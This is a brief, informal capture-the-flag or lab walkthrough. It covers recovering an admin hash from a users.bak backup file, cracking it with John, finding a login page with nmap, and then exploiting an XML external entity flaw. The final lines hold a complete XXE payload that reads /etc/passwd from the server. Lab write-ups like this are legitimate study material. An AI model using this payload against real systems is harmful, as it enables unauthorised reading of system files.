It's been soooooo long,,,


so from the custom directory we get a users.bak file

that gave us admin<hash>

the chef dosen't hash, chef does encoding ex. base32, not hash 

so had to use john to crack hash

nmap showed three ports went to the third and was login page

logged in with admin:and hash lost command line history

This is where we do the xxe

<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]> <comment> <name>Joe Hamd</name> <author>Barry Clad</author> <com>&ent;</com> </comment>


